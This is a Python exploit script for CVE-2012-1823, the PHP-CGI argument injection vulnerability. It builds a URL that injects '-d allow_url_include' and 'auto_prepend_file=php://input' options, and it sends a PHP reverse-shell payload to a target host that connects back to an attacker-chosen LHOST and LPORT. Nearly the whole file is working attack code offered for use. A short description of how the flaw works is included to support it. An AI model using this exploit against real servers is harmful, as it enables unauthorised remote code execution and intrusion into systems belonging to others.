import requests
import argparse
import logging
import json

logging.basicConfig(format='%(message)s')

"""
CVE-2012-1823
Exploit DB: https://www.exploit-db.com/exploits/18836/
Metasploit: https://www.rapid7.com/db/modules/exploit/multi/http/php_cgi_arg_injection
"""

DESCRIPTION = """
In PHP CGI installations up to 5.3.12 and 5.4.2, the input is unsanitized. Additional options can be passed with the `-d` flag to overwrite the propreties specified in /etc/php5/cgi/php.ini'. Specifically the required options are:
1. allow_url_include=on
   - This options allows the inclusion of php scripts from outside the `include_path` option (which is specified in the php.ini file)
   - This assumes that `allow_url_fopen = on`, which is a prerequisite
2. auto_prepend_file=php://input
   - This allows the response body to be parsed and executed by the CGI php interpreter before the intended CGI executable/script (if there even is one)
"""

parser = argparse.ArgumentParser(description=DESCRIPTION,
                                 formatter_class=argparse.RawDescriptionHelpFormatter)
parser.add_argument('rhost', metavar='RHOST')
parser.add_argument('lhost', metavar='LHOST')
parser.add_argument('--rport', default=80)
parser.add_argument('--lport', default=4444)
parser.add_argument('--cgi-uri',
                    default='/?-dallow_url_include%3don+-dauto_prepend_file%3dphp://input',
                    dest='cgi_uri')
parser.add_argument('--log-level', default='INFO', dest='log_level')


def main(args):
    with open('shells.json', 'r') as f:
        shells = json.load(f)

    payload = shells['reverse']['php'][0].format(LHOST=args.lhost, LPORT=args.lport, FD=4)
    payload = '<?php {}?>'.format(payload)
    logging.debug('Using payload: {}\n'.format(payload))

    r = requests.get('http://'+args.rhost+':'+str(args.rport)+args.cgi_uri,
                     data=payload)
    logging.debug(r.text)


if __name__ == '__main__':
    args = parser.parse_args()
    logging.getLogger().setLevel(getattr(logging, args.log_level))

    main(args)
